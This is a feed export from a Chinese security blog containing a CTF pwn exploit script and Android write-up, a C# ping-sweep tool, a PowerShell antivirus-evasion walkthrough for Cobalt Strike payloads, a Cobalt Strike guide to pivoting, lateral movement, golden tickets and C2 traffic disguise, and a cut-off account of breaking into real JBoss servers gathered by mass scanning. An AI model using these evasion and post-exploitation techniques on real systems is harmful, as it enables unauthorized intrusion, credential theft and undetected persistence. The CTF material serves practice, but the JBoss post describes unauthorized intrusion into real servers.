remote(&apos;47.104.16.75&apos;,9000)</span><br><span class="line">#p = process(&apos;./pwn50&apos;)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;admin&quot;)              #Send username</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;T6OBSh2i&quot;)       #Send password</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)                        #Choose 1. exec command</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)            #Send cmd</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;\x90&quot;*0x58 + p64(0x40084A))       #Change return address</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag{welcome_to_iscc}</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p>附件地址：<a href="https://pan.baidu.com/s/1cWKBmVl1xTiaSWaODt5Rlw" target="_blank" rel="noopener">小试牛刀</a></p><p>拖进<code>JEB2</code>，查看<code>Manifest</code>、<code>action</code>等基础信息。这道题的坑就是壳的问题。</p><p><img src="/image/ISCC-2018/Mobile1.png" alt=""></p><p>后来发现，<code>Assets</code>中的<code>bfsprotect.jar</code>就是源码。</p><p><img src="/image/ISCC-2018/Mobile1-1.png" alt=""></p><p>右键<code>MainActivity</code>选择<code>Decompile</code>查看源码，一览无遗。</p><p>在<code>onCreate()</code>中发现了下面这个判断，与APP页面的判断显示一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View arg5) &#123;</span><br><span class="line">                if(!new ProtectClass().protectMethod(MainActivity.this.editText.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.this, &quot;Wrong Flag&quot;, 0).show();</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.this, &quot;Correct Flag&quot;, 0).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>进入<code>ProtectClass()</code>查看，就能看到对比的值，也就是flag值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public boolean protectMethod(String arg4) &#123;</span><br><span class="line">    int v1;</span><br><span class="line">    for(v1 = 0; v1 &lt; MainActivity.runTimes &gt;&gt; 1; ++v1) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return arg4.equals(&quot;BFS-ISCC&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者，打开<code>bfsprotect.jar</code>，直接搜索<code>iscc</code>即可得到flag</p><p><img src="/image/ISCC-2018/Mobile1-2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;又一年，不过今年的质量有些…..&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://rcoil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://rcoil.me/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://rcoil.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>C段ping操作（C#入门）</title>
    <link href="https://rcoil.me/2018/04/C%E6%AE%B5ping%E6%93%8D%E4%BD%9C/"/>
    <id>https://rcoil.me/2018/04/C段ping操作/</id>
    <published>2018-04-14T06:37:56.000Z</published>
    <updated>2018-04-24T13:07:56.961Z</updated>
    
    <content type="html"><![CDATA[<p>利用周末，造个轮子，学习C#！！</p><a id="more"></a><h2 id="官方examples"><a href="#官方examples" class="headerlink" title="官方examples"></a>官方examples</h2><p>查看官方的Ping类，已经很成熟了。以下为官方<code>examples</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void Main (string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Ping pingSender = new Ping ();</span><br><span class="line">            PingOptions options = new PingOptions ();</span><br><span class="line"></span><br><span class="line">            // Use the default Ttl value which is 128,</span><br><span class="line">            // but change the fragmentation behavior.</span><br><span class="line">            options.DontFragment = true;</span><br><span class="line"></span><br><span class="line">            // Create a buffer of 32 bytes of data to be transmitted.</span><br><span class="line">            string data = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line">            byte[] buffer = Encoding.ASCII.GetBytes (data);</span><br><span class="line">            int timeout = 120;</span><br><span class="line">            PingReply reply = pingSender.Send (args[0], timeout, buffer, options);</span><br><span class="line">            if (reply.Status == IPStatus.Success)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());</span><br><span class="line">                Console.WriteLine (&quot;RoundTrip time: &#123;0&#125;&quot;, reply.RoundtripTime);</span><br><span class="line">                Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl);</span><br><span class="line">                Console.WriteLine (&quot;Don&apos;t fragment: &#123;0&#125;&quot;, reply.Options.DontFragment);</span><br><span class="line">                Console.WriteLine (&quot;Buffer size: &#123;0&#125;&quot;, reply.Buffer.Length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/image/C段ping操作/examples.png" alt=""></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="数据显示"><a href="#数据显示" class="headerlink" title="数据显示"></a>数据显示</h3><p>官方demo中使用的是默认的<code>Ttl</code>（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());</span><br><span class="line">Console.WriteLine (&quot;HostName: &#123;0&#125;&quot;, Dns.GetHostEntry(reply.Address.ToString()).HostName);</span><br><span class="line">Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl);</span><br></pre></td></tr></table></figure><p>这只能识别windows系统的，毕竟是128。emmm。</p><p><img src="/image/C段ping操作/hostname.png" alt=""></p><h3 id="正则匹配IP"><a href="#正则匹配IP" class="headerlink" title="正则匹配IP"></a>正则匹配IP</h3><p>使用正则去匹配输入的IP地址是否合理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@&quot;\d+\.\d+\.\d+\.\d+&quot;);// (提取IP地址时有用)</span><br><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@&quot;((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))&quot;);</span><br><span class="line">// IP地址</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>调用处理：</p><p><img src="/image/C段ping操作/regex-1.png" alt=""></p><p>效果：</p><p><img src="/image/C段ping操作/regex.png" alt=""></p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束</p><p><img src="/image/C段ping操作/demo.png" alt=""></p><p>项目地址：<a href="https://github.com/RcoIl/cping" target="_blank" rel="noopener"><i class="fab fa-github" icon-2x=""></i></a></p><p>【参考】</p><p><a href="https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用周末，造个轮子，学习C#！！&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="tools" scheme="https://rcoil.me/tags/tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PowerShell免杀（一）</title>
    <link href="https://rcoil.me/2018/04/%E3%80%90%E5%85%8D%E6%9D%80%E3%80%91PowerShell%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://rcoil.me/2018/04/【免杀】PowerShell免杀（一）/</id>
    <published>2018-04-11T07:23:41.000Z</published>
    <updated>2018-11-26T08:00:42.501Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看免杀<br><a id="more"></a></p><h2 id="0x00-代码块"><a href="#0x00-代码块" class="headerlink" title="0x00 代码块"></a>0x00 代码块</h2><p>可以使用<code>PowerShell</code>的一个语言特性做通用免杀，那就是代码块（即<code>ScriptBlock</code>）。</p><p>代码块是一段可以被执行的PowerShell代码，通常是把代码块直接放在闭合的大括号中，类似函数<code>function</code>，带上代码块更加灵活，可以作为函数参数传递，也可以动态生成和调用。若想在PowerShell中动态创建代码块，首先得知道如何将一段字符串换成代码块对象。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$scriptblock</span> = [SriptBlock]::Create(<span class="string">'notepad'</span>)</span><br></pre></td></tr></table></figure></p><p>先是字符串，然后转换成代码块对象，当然这个字符串也可以是变量。</p><p>调用方法：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="variable">$scriptblock</span></span><br><span class="line">或者可以直接</span><br><span class="line"><span class="built_in">Invoke-Command</span> -ScriptBlock ([ScriptBlock]::Create(<span class="string">'notepad'</span>))</span><br><span class="line">代码块操作操作符(&amp;)</span><br><span class="line">&amp;<span class="variable">$scriptblock</span></span><br></pre></td></tr></table></figure></p><h2 id="0x01-加解密"><a href="#0x01-加解密" class="headerlink" title="0x01 加解密"></a>0x01 加解密</h2><p>先对家吗进行加密，再加密执行</p><p>说到加密，最先想到的就是<code>base64</code>的编码加密了，既然容易想到，那就容易被杀。实现：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"RcoIl"</span></span><br><span class="line"><span class="comment"># $str = [System.IO.File]::ReadAllText("C:\Users\allen\Desktop\payload.ps1");</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Ascii.GetBytes(<span class="variable">$str</span>) <span class="comment"># 编码方式变一下也无所谓</span></span><br><span class="line"><span class="variable">$encode</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)  <span class="comment"># 加密</span></span><br><span class="line"><span class="variable">$encode</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> =[Convert]::FromBase64String(<span class="variable">$encode</span>); <span class="comment">#解密</span></span><br><span class="line"><span class="variable">$byte</span> = [System.Text.Encoding]::Ascii.GetString(<span class="variable">$decode</span>)</span><br><span class="line"><span class="variable">$byte</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">PS C:\Users\allen\Desktop&gt; .\demo.ps1</span><br><span class="line">UmNvSWw=</span><br><span class="line">RcoIl</span><br></pre></td></tr></table></figure></p><p>加上异或<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"RcoIl"</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Ascii.GetBytes(<span class="variable">$str</span>)</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$bytes</span>.count; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$bytes</span>[<span class="variable">$i</span>] = <span class="variable">$bytes</span>[<span class="variable">$i</span>] -bxor <span class="number">0</span>x98 <span class="comment"># 异或</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$encode</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)  <span class="comment"># 加密</span></span><br><span class="line"><span class="variable">$encode</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> =[Convert]::FromBase64String(<span class="variable">$encode</span>); <span class="comment">#解密</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$decode</span>.count; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$decode</span>[<span class="variable">$i</span>] = <span class="variable">$decode</span>[<span class="variable">$i</span>] -bxor <span class="number">0</span>x98 <span class="comment"># 异或</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$byte</span> = [System.Text.Encoding]::Ascii.GetString(<span class="variable">$decode</span>)</span><br><span class="line"><span class="variable">$byte</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">PS C:\Users\allen\Desktop&gt; .\demo.ps1</span><br><span class="line">ypj7mPeY0Zj0mA==</span><br><span class="line">RcoIl</span><br></pre></td></tr></table></figure></p><h2 id="0x02-免杀效果"><a href="#0x02-免杀效果" class="headerlink" title="0x02 免杀效果"></a>0x02 免杀效果</h2><p>payload选择的是Cobalt Strike 3.8生成的payload.ps1<br>编译生成exe.<br><img src="/image/PowerShell免杀（一）/blog_2018-04-11_15-52-59.png" alt=""><br>当然，在实际测试过程中并没有那么完美，至少没能绕过avp的行为查杀。</p><p>【参考】</p><p><a href="https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2" target="_blank" rel="noopener">https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看免杀&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="PowerShell" scheme="https://rcoil.me/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike上手学习</title>
    <link href="https://rcoil.me/2018/04/Cobalt%20Strike%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rcoil.me/2018/04/Cobalt Strike学习/</id>
    <published>2018-04-07T05:21:16.000Z</published>
    <updated>2018-04-09T00:52:01.337Z</updated>
    
    <content type="html"><![CDATA[<p>Cobalt Strike是一款非常优秀的后渗透平台，基于Java。</p><a id="more"></a><p>日常的Cobalt Strike学习，Cobalt Strike提供的UI界面，使得很多操作都很容易理解，所以使得很多操作变得更加的简单。</p><h2 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h2><font color="#0099ff" size="3" face="黑体">beacon</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">是Cobalt Strike内嵌的监听器，也就是说，当在目标系统成功执行payload后，</span><br><span class="line">会弹会一个beacon的shell给Cobalt Strike，</span><br><span class="line">该shell所支持的通信协议主要包括dns、https、http、smp[pipe]。</span><br></pre></td></tr></table></figure><p>实战中尽可能使用dns，或者，不用IP而使用域名。</p><font color="#0099ff" size="3" face="黑体">foreign</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">提供给外部使用的一些监听器，</span><br><span class="line">比如你想利用Cobalt Strike派生一个Meterpreter的shell进行内网渗透，</span><br><span class="line">这就需要用到foreign。</span><br></pre></td></tr></table></figure><h2 id="使用powershell"><a href="#使用powershell" class="headerlink" title="使用powershell"></a>使用powershell</h2><p>第一种方式：在beacon shell中导入外部ps脚本到远程机器上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import /root/Desktop/PowerView.ps1</span><br><span class="line">powershell Get-NetGroup -GroupName *admin*</span><br></pre></td></tr></table></figure><p>第二种方式：在beacon shell中直接执行powershell代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-NetGroup</span><br></pre></td></tr></table></figure><p><img src="/image/Cobalt Strike学习/powerpick.png" alt=""></p><h2 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h2><p>为了让CS和msf互相间联通使用，在目标机器上开启socks4a代理。</p><p>[<strong>Beacon</strong>]–&gt;[<strong>Pivoting</strong>]–&gt;[<strong>SOCKS Server</strong>] 或者直接在beacon中执行<code>socks post</code></p><p><img src="/image/Cobalt Strike学习/socks-start.png" alt=""></p><p>第一种利用方式：利用各种socks代理客户端直接把各类渗透工具带进目标进网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/proxychains.conf</span><br><span class="line">socks4 lhost 2333</span><br><span class="line"># proxychains msfconsole</span><br></pre></td></tr></table></figure><p>第二种利用方式：直接利用隧道把整个msf带进目标内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole</span><br><span class="line">setg Proxies socks4:lhost:2333</span><br></pre></td></tr></table></figure><p><img src="/image/Cobalt Strike学习/socks-setg.png" alt=""></p><h2 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h2><p><img src="/image/Cobalt Strike学习/socks-ssh.png" alt=""></p><p>使用<code>upload</code>和<code>download</code>进行上传下载。也可以通过socks代理进行登陆。</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>[<strong>Beacon</strong>]–&gt;[<strong>access</strong>]–&gt;[<strong>Elevate</strong>]</p><p><img src="/image/Cobalt Strike学习/权限提升-elevate.png" alt=""></p><p>Cobalt Strike 内嵌了两个提权exp，<code>ms14-058</code>是个老提权漏洞利用方式，可利用于<code>Windows 7</code>系统。</p><p><code>uac-dll</code>是一种Bypass UAC攻击，是由本地管理员运行payload从中等权限往最高权限提升的过程，适用于<code>windows 7</code>和<code>windows 10</code>。</p><p>可以通过导入cna文件进行丰富漏洞库。项目地址为：<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener"><strong>ElevateKit</strong></a></p><p><img src="/image/Cobalt Strike学习/权限提升-elevate-kit.png" alt=""></p><h2 id="Spawn"><a href="#Spawn" class="headerlink" title="Spawn"></a>Spawn</h2><p>可使用spawn功能孵化出n个shell，shell与shell之间相当于以一种级联的形式存在。</p><p><strong>作用：</strong>将公网某团队服务器的beacon shell 派生到本地团队服务器指定的监听器上，或是派生到msf。</p><font color="#0099ff" size="3" face="黑体">派生至本地团队服务器</font><p><img src="/image/Cobalt Strike学习/spawn-local.png" alt=""></p><p>建立好监听器，返回到左边的公网团队服务器使用spawn功能，选择刚刚建立的监听器。</p><p><img src="/image/Cobalt Strike学习/spawn-listener.png" alt=""></p><p>过一会儿就能看到shell被正常弹到本地团队服务器指定的监听器上。</p><font color="#0099ff" size="3" face="黑体">派生至Meterpreter</font><p>在公网团队服务器上创建一个外部foreign监听器（本地msf与CS使用的协议无比相同）</p><p><img src="/image/Cobalt Strike学习/spawn-foregn.png" alt=""></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p><img src="/image/Cobalt Strike学习/横向移动-login.png" alt=""></p><p>首先，要决定用哪种方法来横向移动（当前环境需要高度完整的管理员权限才能完成正常操作）。</p><ul><li><p>如果想使用token作用于某个Beacon，那就选中当前会话的Token框，</p></li><li><p>如果想使用证书或哈希来横向移动，就从凭证存储库中选择凭据或填充用户、密码和域等字段，Beacon会将此信息作为需要的令牌。</p></li><li><p>选择用于横向移动的Listener，通常这个会选择使用HTTPS。</p></li><li><p>最后选择Session，这选项只需要选择同个内网机器Session即可（已上线）。</p><p><img src="/image/Cobalt Strike学习/横向移动-login-1.png" alt=""></p></li></ul><p><strong>PS：</strong></p><p>Cobalt Strike的异步进攻模式要求每一次攻击都是以当前一个受损系统（已控）为跳板执行的。如果存在多台已控机器，则优先考虑Windows系统作为跳板机，且利用所有的凭证或哈希，攻击成功则会反馈在Beacon控制台中。</p><p>查看<a href="https://youtu.be/mpsdLuJ-J_U" target="_blank" rel="noopener"><strong>官方操作</strong></a>，与日常操作方式不太一样。</p><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>通过红色区域（指已获取beacon shell的机器）做一个重定向到蓝色区域（没有取得控制权的目标机器）有漏洞的机器。</p><p>查看说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help rportfwd</span><br><span class="line">Use: rportfwd [bind port] [forward host] [forward port]</span><br><span class="line">     rportfwd stop [bind port]</span><br><span class="line"></span><br><span class="line">Binds the specified port on the target host. When a connection comes in,</span><br><span class="line">Cobalt Strike will make a connection to the forwarded host/port and use Beacon</span><br><span class="line">to relay traffic between the two connections.</span><br></pre></td></tr></table></figure><p>第一个参数为监听端口，第二个参数是转发主机和转发端口。<strong>注意：</strong>目标主机都会有防火墙拦截链接（弹框提示）。</p><p>becon  shell 内置了端口转发功能，把本机的某个端口转发到公网（如3389）。</p><p>[<strong>Beacon</strong>]–&gt;[<strong>Pivoting</strong>]–&gt;[<strong>Listener</strong>]</p><p><img src="/image/Cobalt Strike学习/Listener-3389.png" alt=""></p><p>接下来正常链接<code>x.35</code>这台的2333端口即可。</p><font color="#0099ff" size="3" face="黑体">内网机器</font><p>在Beacon shell中建立一条新的监听规则。</p><p><img src="/image/Cobalt Strike学习/Listener-rportfwd.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell netstat -ano | findstr &quot;7878&quot;</span><br><span class="line">[*] Tasked beacon to run: netstat -ano | findstr &quot;7878&quot;</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">  TCP    0.0.0.0:7878           0.0.0.0:0              LISTENING       3516</span><br></pre></td></tr></table></figure><p>在Cobalt Strike当中新建一个Listener，内容如图所示：</p><p><img src="/image/Cobalt Strike学习/Listener.png" alt=""></p><p>上线的Listener选择新建的<code>rportfwd-listener</code>即可。</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>使用域管理员权限伪造一张黄金票据是最常见的方法。</p><p>制作黄金票据的前提条件：</p><ul><li>想要伪造票据的用户</li><li>为其创建票据的域名</li><li>域的SID（whomai /user）</li><li>域控制器上krbtgt用户的NTLM哈希值</li></ul><p><img src="/image/Cobalt Strike学习/黄金票据.png" alt=""></p><p><strong>PS</strong>：</p><p>首先要使用<code>klist /purge</code>清除缓存的授权票据。</p><h2 id="Malleable-C2"><a href="#Malleable-C2" class="headerlink" title="Malleable-C2"></a>Malleable-C2</h2><p>自从Cobalt Strike更新至3.6版本后，官方给出了一个Malleable-C2，也就是在启动团队服务器（服务端）的时候加载一些配置文件，这是一个非常棒的功能，可以帮助我们伪装流量、SSL加密通讯，达到隐匿的效果，值得一用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/cobaltstrike/</span><br><span class="line">git clone https://github.com/rsmudge/Malleable-C2-Profiles</span><br><span class="line"># 使用方法：./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cobaltstrike.com/support" target="_blank" rel="noopener">Cobalt Strike-help</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cobalt Strike是一款非常优秀的后渗透平台，基于Java。&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>JBoss引起的内网渗透-3</title>
    <link href="https://rcoil.me/2018/03/JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3/"/>
    <id>https://rcoil.me/2018/03/JBoss引起的内网渗透-3/</id>
    <published>2018-03-25T01:00:03.000Z</published>
    <updated>2018-03-26T11:43:43.465Z</updated>
    
    <content type="html"><![CDATA[<p>待人如知己！！！</p><a id="more"></a><p>首先说明，这个系列的JBoss都是批量获取的，并不是针对某地区某组织而为。</p><p><code>WebShell</code>如同上一篇文章获取，但是这次是直接上传<code>jsp脚本</code>文件，这样更加快捷。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本机用户信息：</span><br><span class="line">%computername% --&gt; SZXzzAO-RxxxSY</span><br><span class="line">ifconfig --&gt; 192.168.140.171 </span><br><span class="line">%os% --&gt; Windows Server 2008 R2 x64</span><br><span class="line">System Model --&gt; VMware Virtual Platform</span><br><span class="line">Statistiques depuis --&gt; 19/03/2018 15:00:18</span><br><span class="line">域情况：</span><br><span class="line">存在域</span><br><span class="line">使用循环ping找出了50+台C段存活主机</span><br></pre></td></tr></table></figure><p>翻阅目录</p><ul><li>从用户目录来看，发现域管登录的痕迹；</li><li>C盘根目录下有<code>metasploit</code>，创建时间为<code>2016-04-19</code>；</li><li>用户<code>support</code>用于黑客行为操作用户（<code>CrackMapExec</code>扫描日志等）；</li><li>在<code>deploy\management</code>存在大量后门文件；</li><li>在<code>$Recycle.Bin</code>存在已删除的恶意exe可执行文件；</li><li>存在<code>Panda Security</code>（熊猫卫士）文件夹</li><li>后门之多无法想象。</li></ul><p><img src="/image/JBoss引起的内网渗透-3/JBoss-desktop.png" alt=""></p><p>进程收集</p><ul><li>存在<code>PSANHost.exe</code>（熊猫卫士）</li><li>大量的<code>cmd.exe</code>、<code>powershell.exe</code>及<code>taskkill.exe</code></li></ul><p>其他</p><ul><li>screenshot –&gt; 锁屏</li></ul><h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>上传的<code>远控可执行文件</code>运行无反应；</li><li>执行Desktop下的<code>mimikatz.exe</code>，一执行就消失（杀软？）；</li><li>使用<code>powershell</code>执行mimikatz获取hash，但密码为空（注册表被篡改了？）；</li><li>无法将自添加的用户加入管理员组；</li><li>无法执行<code>net view</code>等命令（net 系列缺失）。</li></ul><h3 id="分析"><a href="#分析" class="headerlink" 